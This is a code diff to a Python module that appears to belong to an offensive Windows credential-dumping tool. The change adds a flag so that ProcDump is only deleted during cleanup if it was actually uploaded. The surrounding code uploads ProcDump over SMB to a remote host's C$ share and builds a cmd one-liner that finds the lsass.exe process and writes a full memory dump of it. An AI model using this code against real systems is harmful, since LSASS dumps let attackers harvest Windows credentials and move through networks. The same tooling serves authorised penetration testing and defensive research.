@@ -13,6 +13,8 @@ class DumpMethod(IDumpMethod):
         self.procdump_remote_share = "C$"
         self.procdump_remote_path = "\\Windows\\Temp\\"
 
+        self.procdump_uploaded = False
+
     def prepare(self, options):
         self.procdump = options.get("procdump", self.procdump)
         self.procdump_path = options.get("procdump_path", self.procdump_path)
@@ -33,25 +35,27 @@ class DumpMethod(IDumpMethod):
             try:
                 self._session.smb_session.putFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump, p.read)
                 logging.success("Procdump successfully uploaded")
+                self.procdump_uploaded = True
                 return True
             except Exception as e:
                 logging.error("Procdump upload error", exc_info=True)
                 return None
 
     def clean(self):
-        t = time.time()
-        while True:
-            try:
-                self._session.smb_session.deleteFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump)
-                logging.debug("Procdump successfully deleted")
-                return True
-            except Exception as e:
+        if self.procdump_uploaded:
+            t = time.time()
+            while True:
+                try:
+                    self._session.smb_session.deleteFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump)
+                    logging.debug("Procdump successfully deleted")
+                    return True
+                except Exception as e:
 
-                if time.time() - t > 5:
-                    logging.warning("Procdump deletion error.")
-                    return False
-                logging.debug("Procdump deletion error. Retrying...")
-                time.sleep(0.2)
+                    if time.time() - t > 5:
+                        logging.warning("Procdump deletion error.")
+                        return False
+                    logging.debug("Procdump deletion error. Retrying...")
+                    time.sleep(0.2)
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
         cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
